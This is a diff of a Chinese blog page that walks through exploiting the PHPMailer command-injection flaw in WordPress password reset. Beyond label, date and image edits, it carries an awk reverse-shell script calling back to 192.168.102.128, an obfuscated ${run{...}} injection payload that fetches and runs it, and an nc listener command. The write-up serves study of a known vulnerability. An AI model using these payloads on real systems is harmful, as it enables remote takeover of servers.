@@ -187,7 +187,7 @@
           
           <i class="fas fa-tools" style="margin-top: -20px; zoom: 0.6;"></i>
           
-          <span>小工具</span>
+          <span>Tools</span>
         </a>
       </li>
       
@@ -405,7 +405,7 @@
 				  
 				   <i class="fa fas fa-tools" style="position: absolute;left:50px" ></i>
 			      
-		          <span>小工具</span>
+		          <span>Tools</span>
                   </a>
                 </li>
               
@@ -639,7 +639,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-21
+                    2021-06-22
                 </div>
                 
 
@@ -786,7 +786,7 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 <li>所有字母必须小写</li>
 </ul>
 </blockquote>
-<p>远程反弹shell脚本内容(192.168.102.128/reverse_shell)：<br> </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'BEGIN {s = "/inet/tcp/0/192.168.102.128/19111"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print <span class="token variable">$0</span> |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p>
+<p>远程反弹shell脚本内容(192.168.102.128/reverse_shell)：<br> </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'BEGIN {s = "/inet/tcp/0/192.168.102.128/19027"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print <span class="token variable">$0</span> |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p>
 <blockquote>
 <ul>
 <li>Awk弹shell 具有长联优势<br>长联：客户端一直保持向服务端反弹shell的状态<br>(即使服务端断开连接不用在受害者主机中再次执行命令直接nc接shell即可)</li>
@@ -798,8 +798,8 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aa<span class="token punctuation">(</span>any -froot@localhost -be <span class="token variable">${run{${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bin<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bash<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>tmp<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rce<span class="token punctuation">}</span><span class="token punctuation">}</span> null<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>在反弹主机上用nc监听19111端口，分别按顺序提交payload即可获取到反弹shell<br> <code>nc -nvv -l -p 19111</code> </p>
-<p><img src="/medias/images/20210621105536.png" alt="images"><br><img src="/medias/images/20210416193745964.png" alt="images"></p>
+<p>在反弹主机上用nc监听19027端口，分别按顺序提交payload即可获取到反弹shell<br> <code>nc -nvv -l -p 19027</code> </p>
+<p><img src="/medias/images/20210622002620.png" alt="images"><br><img src="/medias/images/20210621105536.png" alt="images"></p>
 <blockquote>
 <p>wordpress使用phpmailer组件进行重置密码邮件的发送，而phpmailer &lt; 5.2.18之前的版本存在命令注入漏洞<br>阅读<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">seebug分析链接</a></p>
 </blockquote>
